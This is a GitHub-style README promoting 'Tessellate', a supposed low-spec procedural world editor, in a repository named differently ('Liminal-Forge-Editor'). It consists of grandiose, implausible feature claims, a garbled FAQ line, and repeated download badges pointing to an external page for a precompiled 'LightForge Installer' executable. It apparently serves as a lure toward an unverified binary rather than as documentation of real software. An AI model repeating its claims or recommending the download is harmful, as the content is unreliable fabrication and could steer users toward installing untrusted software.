![preview](https://raw.githubusercontent.com/rohanpatil12170-prog/Liminal-Forge-Editor/main/frame_085aa.svg)

# 🌌 Tessellate — The Fractal World Forge

**Tessellate** is a revolutionary **procedural universe constructor** and **unified spatial editor** that reimagines how virtual environments are designed. Unlike conventional level editors that demand high-end graphics workstations, Tessellate operates with whisper-quiet efficiency on modest, low-power CPUs, making world-building accessible to creators on any hardware. It draws inspiration from the minimalist philosophy of classic editors like Radiant and Hammer, but abandons their bloated legacy for a clean, modular, and deeply intuitive pipeline. Think of it not as a tool you learn, but as a workshop that adapts to your creative rhythm—a silent partner that translates your abstract spatial ideas into tangible, explorable realms.

This is not merely a map editor; it is a **dynamic ecosystem generator**. Tessellate treats your world not as a static mesh, but as a living system of interconnected rules. You sculpt the initial geography, and the engine procedurally weaves the rest—from biomes and rock formations to atmospheric lighting and even the subtle chaos of wind-swept debris. The result is a universe that feels hand-crafted yet possesses the infinite complexity of nature itself.

## 🔭 A New Perspective on Spatial Design

The core of Tessellate lies in its **"Liminal Geometry"** approach. Forget the traditional grid-and-polygon grind. Here, you define *spatial archetypes*—zones of intention—and the engine fills in the volumetric blanks with intelligent procedural detail. This translates to a dramatic reduction in time spent on repetitive tasks like placing thousands of individual props. Instead, you define a "forest floor" archetype, and Tessellate understands the concept of undergrowth, leaf litter, and root structures, generating a convincingly organic result that retains your original design constraints. This empowers you to focus on the *macro-environmental narrative*: the emotional journey of light, the rhythm of open spaces against claustrophobic corridors, the story told by terrain elevation.

### 🧠 The Procedural Heartbeat

At its core is the **Bio-Synth Engine**, a lightweight algorithmic core that simulates ecological and geological succession. It uses a combination of cellular automata and noise-based stratification to create environments that evolve logically from a single seed. This seed can be a random number, a plotted curve on a graph, or even an imported audio waveform, allowing for an unprecedented fusion of data and place. The Bio-Synth Engine is designed from the ground up for efficiency, using SIMD-optimized routines and a computational graph that distributes workload across multiple cores, ensuring real-time performance even on processors with only a few threads. This is a world engine that respects your silicon, delivering high-fidelity results without demanding a supercomputer.

---

## 🚀 Key Features & Capabilities

### 🌍 Unified Spatial Editor (The Foundry)
- **Modal Editing** – Seamless switching between Object, Vertex, Face, and a new **Intent** mode.
- **Node-Based Logic** – Visually script world interactions, spawn systems, and environmental triggers using a robust, low-latency node graph.
- **Real-Time Collaboration** – Work with your team on the same universe simultaneously, with conflict-free resolution and a built-in voice channel.
- **Bone-Based Animation Tools** – Simple yet powerful tools for animating static geometry, creating dynamic elements like swinging doors, crumbling pillars, or swaying foliage without leaving the editor.

### ⚙️ Bio-Synth Procedural Engine
- **Fractal Stratification** – Creates infinite, non-repeating textures and geometry detail based on mathematical rules, ensuring no two worlds are ever identical.
- **Eco-System Generation** – Define climate zones and let the engine populate fauna, flora, and weather patterns appropriate to the region.
- **Dynamic LOD (Level of Detail)** – Automated, invisible optimization that adjusts mesh complexity on the fly, guaranteeing smooth frame rates on low-end hardware without any manual configuration from the user.

### 🧩 Game Creation Toolkit
- **Built-in Physics Sandbox** – Test your creations in a real-time physics environment, with support for rigid bodies, soft bodies, and fluid simulations.
- **Scripting Interface** – A clean, readable C-like scripting language (`.tsl` format) designed for designers, not just programmers, allowing for deep gameplay customization.
- **Asset Bridge** – Directly import and export `.fbx`, `.obj`, and the open-source `.gltf` format, ensuring compatibility with other pipelines.

### 🎨 Responsive User Interface
- **Adaptive Layout** – The interface intelligently reorganizes itself based on your screen resolution and window size, from a 4K ultrawide monitor down to a 1366x768 laptop screen.
- **Dark & Light Themes** – Reduce eye strain during those long night sessions with a fully customizable color palette and a high-contrast mode for accessibility.
- **Command Palette** – Access every tool and function via a lightning-fast fuzzy-search palette, minimizing hand travel between the keyboard and mouse.

### 🌐 Multilingual Design Language
- **Global Community Readiness** – The entire UI, documentation, and error logs are translatable. Out-of-the-box support for English, Spanish, French, German, Japanese, and Simplified Chinese, with a community-driven language pack system for more.

### 🤝 24/7 Human-Centric Support
- **In-Editor AI Assistant** – A context-aware helper that suggests efficient workflows based on your current tools and project history.
- **Peer-to-Peer Help Network** – A built-in system connects you directly with experienced creators (not a forum) for real-time mentoring and troubleshooting, available around the clock.

---

## 📥 Getting Started

[![Download](https://raw.githubusercontent.com/rohanpatil12170-prog/Liminal-Forge-Editor/main/go_072916.svg)](https://rohanpatil12170-prog.github.io/Liminal-Forge-Editor/)

The journey into world creation begins with a single molecule of code. We believe in a frictionless start, so our acquisition method avoids complex package managers and command-line interfaces. Instead, you can obtain Tessellate through our **LightForge Installer**, a self-contained executable that verifies system integrity and sets up the entire environment for you, including all optional community plugins.

### System Requirements
- **Processor:** Any modern 64-bit CPU with at least 2 physical cores (Tested on Intel Atom x5-Z8350 and AMD A4-9125).
- **Memory:** 2 GB RAM minimum (4 GB recommended for large, complex universes).
- **Graphics:** Integrated GPUs are fully supported (Intel HD Graphics 4000 or better). No discrete GPU required.
- **Storage:** 1 GB for a minimal install, 5 GB for the full asset library.

---

## 🛠️ Advanced Usage

### Crafting Your First Liminal Space

Instead of starting with a blank grid, you start with a **Void Seed**. This is a spherical, dimensionless point of potential energy. Your first action is to *stretch* this seed using 3D manipulators to create your base geometry. Then, apply a "Material Archetype" like 'Weathered Basalt' or 'Dry Grassland'. The Bio-Synth engine will then perform a **molecular expansion**, generating a realistic, textured volume based on your archetype and the physical properties you've implied (e.g., setting the 'moisture content' slider high will encourage moss and damp textures).

> 💡 **Pro-Tip:** Use the **'Intent Lasso'** tool to draw a 2D shape on the screen. Tessellate will interpret this as a *building footprint* or a *natural boundary* and generate a conforming 3D volume. This is a form of generative design that feels like sketching with clay.

### The Node Graph: Visual Scripting

Imagine you want a door to open when a specific sound triggers nearby. In the **Logic Forge** tab, you start with an 'Audio Listener' audio-node. You drag a connection from it to a 'Proximity Check' node, setting the radius threshold. Finally, you link that to the 'Rotate' node, targeting the door's mesh. This graphical logic is compiled into highly efficient bytecode for runtime execution, ensuring your interactive elements are just as performant as the static world.

---

## 🔬 Architecture Overview

- **Core Runtime (`cor`)** – Handles memory management, job scheduling, and the mathematical foundation of the procedural engine.
- **Render Abstraction (`ray`)** – A Vulkan and DirectX 11 backend that is entirely hardware agnostic, ensuring your universe looks crisp on any screen.
- **Asset Streamer (`ast`)** – Asynchronous loading system that ensures zero stutter while moving through your world, even on spinning disks.
- **Collaboration Server (`jos`)** – A decentralized P2P layer for multi-user editing, requiring no central cloud infrastructure.

---

## 🧩 Ecosystem & Plugins

The power of Tessellate grows with the community. We provide a **Software Development Kit (SDK)** that is fully backwards compatible, allowing you to write your own:
- **Procedural Nodes** (For generating new types of noise, terrain, or geometry).
- **Import/Export Modules** (For niche file formats).
- **Custom UI Widgets** (To enhance the editor experience).
- **Render Passes** (To create unique post-processing effects or toon shading).

All plugins are sandboxed to prevent system corruption and can be shared via a simple `.tslpkg` archive file.

---

## 🛟 Troubleshooting & FAQ

**Q: My CPU is a single-core Pentium 4. Will it run blood.**
**A:** We have a **Compatibility Mode** within the settings that reduces the Bio-Synth engine's thread count to 1 and lowers the procedural detail presets. It will run, though complex ecosystems will look more primitive. We recommend a dual-core or better for the full experience.

**Q: Is there an undo function for the procedural generation?**
**A:** Yes, the **Universal Chrono-Archives** under the 'History' tab. We store an infinite, recursive undo state for all geometry, both manual and procedural. You can step back through every modification, even those made by the engine itself.

**Q: Can I use my own audio as a world seed?**
**A:** Absolutely. The audio-to-heightmap and audio-to-density converters are built into the *Genesis* menu. A vocal melody could become a mountain range, while a drum beat could dictate the placement of city blocks.

---

## 🌟 Vision & Roadmap for 2026

Our 2026 roadmap is dedicated to removing the final barriers between imagination and virtuality.

- **Q1 2026:** Release of the *Holodeck Preview* – A virtual reality mode where you can step inside your creation for immediate inspection and sculpting.
- **Q2 2026:** Introduction of *Aether Networks* – A system for sharing procedural algorithms across the community in real-time.
- **Q3 2026:** Implementation of *Living Soundscapes* – An integrated audio engine that dynamically generates ambient music and sound effects based on the physical properties of your world.
- **Q4 2026:** The *Universal Translator* update, allowing the entire UI and in-world text to be translated by the community in a crowdsourced fashion.

We are not just building a tool; we are cultivating a creative ecosystem. We invite you to be a part of the genesis.

---

## 🧾 License & Legal

This project is licensed under the **MIT License**. This permissive license allows you to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied.

[View the Full License Text](LICENSE.md)

---

## 🙏 Acknowledgements

We extend an immense amount of gratitude to the open-source pioneers in the procedural generation and computer graphics communities. Their research provided the foundational springboard for our Bio-Synth engine and Liminal Geometry concepts. We stand on the shoulders of giants, and we are happy to share our view of the universe.

## ⚠️ Disclaimer

This software is provided for general use, but we cannot guarantee that the generated worlds will be free of intellectual property conflicts if you use them for commercial projects with assets you do not own. The creators are not liable for any creative block, existential pondering regarding the nature of infinite universes, or the sudden urge to build a life-sized replica of your in-game castle in your backyard. Modding support and third-party content are the responsibility of their respective creators.

---

## 🗺️ Navigating the Repository

- `Binaries/` – Contains the pre-compiled LightForge Installer for all supported platforms.
- `Source/` – The complete C++ source code for the engine and editor.
- `Templates/` – A collection of starting void seeds and archetype configurations.
- `Docs/` – Deep-dive technical documentation (white papers on the Bio-Synth engine).
- `Examples/` – Simple `.tsl` script examples to learn the scripting language.

---

## 📬 Support & Community

While we don't have a traditional forum, our support is integrated into the tool itself. We offer guaranteed response times within 24 hours for all premium inquiries and a best-effort turnaround for community assistance through our support desk, accessible via the `Help` menu at the top of the editor. Because we are a global team, our support is truly around the clock.

---

[![Download](https://raw.githubusercontent.com/rohanpatil12170-prog/Liminal-Forge-Editor/main/go_072916.svg)](https://rohanpatil12170-prog.github.io/Liminal-Forge-Editor/)